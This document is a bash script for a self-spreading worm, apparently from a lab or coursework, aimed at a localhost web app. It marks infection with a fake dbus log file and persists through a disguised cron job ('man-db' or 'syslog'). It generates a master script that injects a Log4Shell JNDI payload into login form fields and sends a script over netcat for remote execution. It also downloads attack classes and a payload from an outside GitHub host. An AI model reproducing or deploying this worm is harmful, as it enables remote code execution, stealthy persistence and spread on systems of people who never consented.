#!/bin/bash

# Check if the machine has already been infected

USER=`whoami`
FILENAME=".dbus-update-errors"
FILESYSTEM_FILE="$HOME/$FILENAME"

MSG="dbus-update-activation-environment: setting DISPLAY=:0 \n
dbus-update-activation-environment: setting XAUTHORITY=/home/$USER/.Xauthority \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting SHELL=/bin/bash \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0 \n
dbus-update-activation-environment: setting PWD=`pwd` \n
dbus-update-activation-environment: setting GDM_LANG=en_US \n
dbus-update-activation-environment: setting HOME=$HOME \n
dbus-update-activation-environment: setting IM_CONFIG_PHASE=1 \n
dbus-update-activation-environment: setting LANG=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_PAPER=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_NUMERIC=en_US.UTF-8 \n
dbus-update-activation-environment: setting _=/usr/bin/dbus-update-activation-environment \n"

# File requirements:
# 	REAL_SCRIPT: it's the master script that actually exploits log4shell (aka Master script)
# 	INFECTION: it's literally this script
# 	JAVA_RMI_SERVER: it's the RMI server (.class and .jar files)

REAL_SCRIPT_NAME="Im_legit"
REAL_SCRIPT_LOCATION="$HOME/$REAL_SCRIPT_NAME"
INFECTION_NAME="Im_a_legit_worm"
INFECTION_LOCATION="$HOME/$INFECTION_NAME"
JAVA_RMI_SERVER_LOCATION="$HOME"

IP_TARGET="localhost:8081"
IP_TARGET_LOGIN="localhost:8081/login"


CRON_SCRIPT_CONTENT="#!/bin/bash \n
# touch $HOME/Hi_ITS_ME \n
$REAL_SCRIPT_LOCATION $IP_TARGET $IP_TARGET_LOGIN $INFECTION_LOCATION > /dev/null 2>&1 \n" # 2> &1 moves stderr to stdout

if [ ! -f "$FILESYSTEM_FILE" ]; then
	echo -e $MSG > $FILESYSTEM_FILE # Use touch to modify the dates?
else
	exit
fi


# We only proceed if it hasn't been infected

if [ $USER == "root" ] && [ -d "/etc/cron.hourly" ]; then # Write in /etc/cron.hourly
	SCRIPT_NAME="man-db" # Careful with name, otherwise it won't be run by cron
	# run-parts --test /etc/cron.hourly to test it
	SCRIPT_PATH="/etc/cron.hourly/$SCRIPT_NAME"
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
else # Create an entry in crontab
	SCRIPT_NAME="syslog"
	SCRIPT_PATH="$HOME/$SCRIPT_NAME"	
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
	# Maybe do some fancy and fun stuff...
	EDITOR="vi"
	(crontab -l | echo -e "0 * * * * $SCRIPT_PATH") | crontab -
fi

MASTER_SCRIPT='#!/bin/bash \nif [ $# -ne 3 ] \nthen \necho "Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION" \necho "Eg: ./Master_script.sh localhost:8080 localhost:8080/login test_script_touch.sh" \necho "Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh" \nexit -1 \nfi \nLOGIN_PAGE=$1 \nTARGET_URL=$2 \nSCRIPT=$3 \nlist=`curl $LOGIN_PAGE | awk "/<input/,/>/" | grep -Po "name=\"\K[^\"]*"` \nmalicious_user="%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D" \nstr_req="" \nfor element in $list \ndo \nnew_field="${element}=$malicious_user" \nif [ ! -z "$str_req" ] \nthen \nstr_req="${str_req}&" \nfi \nstr_req="${str_req}${new_field}" \ndone \ncd $JAVA_RMI_SERVER_LOCATION ; java -cp tomcat-catalina-8.5.83.jar:. Attack & \nJAVA_PID=$! \nsleep 2 \ncurl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL \nnc_exit_code=1 \nwhile [ "$nc_exit_code" -ne 0 ]; do \nsleep 2 \ncat $SCRIPT | nc -q 0 localhost 6969 \nnc_exit_code=$? \ndone \nkill -kill $JAVA_PID \n'


echo -e $MASTER_SCRIPT > $REAL_SCRIPT_LOCATION
chmod +x $REAL_SCRIPT_LOCATION


wget -O $JAVA_RMI_SERVER_LOCATION/Attack.class "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/Attack.class?raw=true" > /tmp/log.XX 2>&1
wget -O $JAVA_RMI_SERVER_LOCATION/tomcat-catalina-8.5.83.jar "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/tomcat-catalina-8.5.83.jar?raw=true"  > /tmp/log.XX 2>&1
wget -O $INFECTION_LOCATION "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/test_script_touch.sh?raw=true"  > /tmp/log.XX 2>&1
# wget -O $INFECTION_LOCATION https://raw.githubusercontent.com/aviba2000/MALWARE_aux_filed/master/test_script_touch.sh
chmod +x $INFECTION_LOCATION






